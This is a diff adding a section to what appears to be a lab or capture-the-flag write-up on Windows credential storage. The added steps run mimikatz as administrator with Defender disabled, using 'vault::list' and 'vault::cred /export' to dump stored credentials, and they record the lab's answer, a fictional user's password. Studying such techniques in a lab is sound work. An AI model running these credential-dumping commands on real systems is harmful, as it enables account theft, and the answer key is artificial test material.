@@ -28,4 +28,16 @@ Learn how credentials are stored, cached, and exposed in Windows and Active Dire
 
 ## Credential Extraction with Mimikatz
 
-- 
+### What is Elon Tusk's Gmail password?
+
+- RDP into first target machine using provided credentials
+- *mimikatz* is provided on the desktop and *Windows Defender* is disabled
+- Open powershell as administrator and run *mimikatz*
+    - `.\mimikatz.exe`
+    - `vault::list` to show available vaults on the system
+    - `vault::cred /export` to display credentials
+
+> Elon Tusk's Gmail password is **MyTusksAreThaB3st**
+
+## What is svc-app's password?
+
